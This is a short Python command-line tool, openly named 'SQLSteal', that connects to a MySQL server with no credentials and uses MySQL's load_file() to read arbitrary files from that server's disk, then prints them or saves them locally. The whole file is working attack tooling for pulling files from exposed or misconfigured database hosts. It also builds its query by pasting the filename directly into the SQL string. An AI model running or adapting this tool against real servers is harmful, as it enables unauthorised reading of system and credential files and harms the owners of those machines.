#!/usr/bin/env python3
"""SQLSteal

Download files through MySQL.

Usage: sqlsteal.py HOST FILE [-s DIR]

Arguments:
    FILE        The file to download.
    HOST        The MySQL host.

Options:
    -h          Show this help message.
    -s DIR      Save file in dir instead of printing it to stdout.

"""
import os
import sys

import pymysql
from docopt import docopt


def eprint(*args, **kwargs):
    "Print to stderr."
    print(*args, **kwargs, file=sys.stderr)


def store_file(content, filename, store):
    """
    Store a file on disk.

    Args:
        content (bytes): The content of the file.
        filename (str): Filename, duh!
        store (str): The root directory to store the file in.

    """
    filename = os.path.join(
        store,
        filename.lstrip(os.path.sep))
    os.makedirs(
        os.path.dirname(filename),
        exist_ok=True)
    with open(filename, 'wb') as outfile:
        outfile.write(content)


def load_file(host, filename):
    """
    Load a file through MySQL.

    Args:
        host (str): The address of the host.
        filename (str): Filename to fetch.

    Raises:
        Exception: When the file can't be fetched.

    """
    cnx = pymysql.connect(
        host=host)

    try:
        with cnx.cursor() as cursor:
            query = f"select load_file('{filename}')"
            try:
                cursor.execute(query)
            except pymysql.err.InternalError as e:
                if e.args[1].startswith("Can't get stat of"):
                    raise Exception('No such file.')
            for result in cursor:
                return result[0], result[0] is None
    finally:
        cnx.close()


def print_file(filename, content):
    """
    Print file to stdout.

    If the file appears to be a directory or binary the content
    isn't printed.

    Args:
        filename (str): The filename.
        content (bytes): The contents of the file.

    """
    if not content:
        return eprint(f'"{filename}" is a dir')
    try:
        print(content.decode())
    except UnicodeDecodeError:
        eprint(f'"{filename}" is a binary file')


def main(args):
    try:
        result, isdir = load_file(
            args['HOST'],
            args['FILE'])
    except Exception as e:
        exit(e)
    if not isdir and args['-s']:
        store_file(
            result,
            args['FILE'],
            args['-s'])
    else:
        print_file(
            args['FILE'],
            result)


if __name__ == '__main__':
    args = docopt(__doc__)
    main(args)
